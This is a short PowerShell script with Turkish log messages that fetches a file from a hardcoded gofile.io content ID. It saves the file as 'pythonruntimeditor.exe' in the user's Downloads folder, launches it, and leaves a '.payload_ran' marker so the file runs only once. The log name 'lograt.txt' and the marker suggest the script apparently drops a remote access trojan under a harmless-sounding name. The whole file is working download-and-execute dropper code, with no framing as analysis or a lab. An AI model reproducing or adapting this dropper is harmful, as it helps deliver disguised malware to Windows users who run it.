$gofileCode = "lBhjqd"
$logFile = "$env:USERPROFILE\Downloads\lograt.txt"
$log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }

try {
    & $log "Script başlatıldı."

    $apiUrl = "https://api.gofile.io/getContent?contentId=$gofileCode&token=&websiteToken=websiteToken&cache=true"
    $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    $directUrl = $json.data.contents.PSObject.Properties.Value[0].link
    & $log "Gofile linki alındı: $directUrl"

    $localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
    $markerPath = "$env:USERPROFILE\Downloads\.payload_ran"

    if (-not (Test-Path $localPath)) {
        & $log "EXE indiriliyor..."
        Invoke-WebRequest -Uri $directUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
        & $log "EXE indirildi: $localPath"
    } else {
        & $log "EXE zaten mevcut: $localPath"
    }

    if (-not (Test-Path $markerPath)) {
        & $log "EXE çalıştırılıyor..."
        Start-Process -FilePath $localPath -WindowStyle Normal
        & $log "EXE çalıştırıldı."
        New-Item -Path $markerPath -ItemType File -Force | Out-Null
        & $log "Marker dosyası oluşturuldu."
    } else {
        & $log "EXE daha önce çalıştırılmış, tekrar çalıştırılmıyor."
    }
} catch {
    & $log "HATA: $($_.Exception.Message)"
}
